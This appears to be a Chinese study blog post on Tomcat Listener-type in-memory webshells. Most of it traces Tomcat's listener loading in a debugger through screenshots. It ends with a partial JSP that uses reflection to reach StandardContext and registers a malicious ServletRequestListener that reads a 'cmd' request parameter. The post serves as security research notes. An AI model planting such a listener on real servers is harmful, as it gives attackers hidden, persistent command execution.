---
title: Listener型内存马
date: 2026-06-12 08:05:39
updated: 2026-06-25 08:06:27
tags:
  - Web
  - 内存马
  - Tomcat内存马
---
-   参考: [Java内存马系列-04-Tomcat 之 Listener 型内存马 | Drunkbaby’s Blog](https://drun1baby.github.io/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/)
...
很明显，ServletRequestListener 是最适合用来作为内存马的。因为 ServletRequestListener 是用来监听 ServletRequest对象的，当我们访问任意资源时，都会触发`ServletRequestListener#requestInitialized()`方法。下面我们来实现一个恶意的 Listener
...
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251535138-c981b818-a69b-4c00-a3e2-797490f701f6.png)
...
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251535289-b877cbb3-b35d-487a-81b3-c264b805ab2a.png)
...
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251535419-39980424-b104-4cf5-a199-d9aa7aa6e11f.png)
...
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251536421-609260cc-a530-445a-9c2e-79056f5d5053.png)

这个方法主要是做一些读取数据并保存的工作，我们不难发现其中读取了 Filter 等 Servlet 组件，我们重点肯定是关注于 Listener 的读取的，最后找到在这个地方读取了 web.xml

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251536678-1551c795-9270-4464-9fb7-7b9710f64e59.png)

所以这个地方，1235 行可以先打个断点，接着我们继续往里看 ———— `addApplicationListener()` 这个方法，进去之后发现是一个接口中的方法，我们去找它的实现方法

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251536941-87f1f722-c873-4f29-93d7-2adcb1431b32.png)
...
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251537132-0a480dc3-0e96-41d3-b5a2-c96dd53749c8.png)

我们看到 webxml 里面的 listener 已经有了对应的 Listener 文件，继续往下走。

总的代码比较啰嗦，但是耐心一点也还好，我们下一步应该是走到 `addApplicationListener()` 这里的

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251537337-eb723801-a03f-4d1d-9149-06d44ded5d60.png)

#### 读取完配置文件，加载 Listener

当我们读取完配置文件，当应用启动的时候，`StandardContext` 会去调用 `listenerStart()` 方法。这个方法做了一些基础的安全检查，最后完成简单的 start 业务。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251537464-106ddc16-ae11-475d-b4c5-9be4415bfae9.png)
...
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251537571-eb2ef13a-e930-4b8a-b782-fbe915eaacf0.png)

正确的断点位置如图

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251537749-369b95c0-84e2-4ae4-b2e7-f5663c1c12e5.png)

开始调试，这里我们先进到 `getApplicationEventListeners()` 方法里面

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251537871-e599c0b7-407b-4630-816c-a002495bd61b.png)
...
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251537990-3921ee4d-5fbb-49c3-9ff1-c22a318c6801.png)
...
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251538080-5ca7f442-9b51-40ce-840c-087eed1e3de1.png)
...
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251538229-04a50c9c-0d26-41eb-ae82-4107069e5577.png)
...
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251538371-9a6ef17f-81f6-4224-a261-ee2c8a3f54aa.png)
...
<%
    try {
        ...
        StandardContext standardContext = (StandardContext) f2.get(ac);

        ServletRequestListener evil = new ServletRequestListener() {
            @Override
            public void requestDestroyed(ServletRequestEvent sre) {
            }
            ...
            public void requestInitialized(ServletRequestEvent sre) {
                ...
                try {
                    ...
                    if (cmd != null) {
                        try {
                            Field rf = req.getClass().getDeclaredField("request");
                            rf.setAccessible(true);
                            Object innerReq = rf.get(req);
                            Field respF = innerReq.getClass().getDeclaredField("response");
                            respF.setAccessible(true);
                            resp = (HttpServletResponse) respF.get(innerReq);
        ...
        Method addMethod = StandardContext.class.getDeclaredMethod("addApplicationEventListener", Object.class);
        addMethod.invoke(standardContext, evil);
...
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251538482-26b01a57-b2b6-4fcd-b19a-75c766246c63.png)
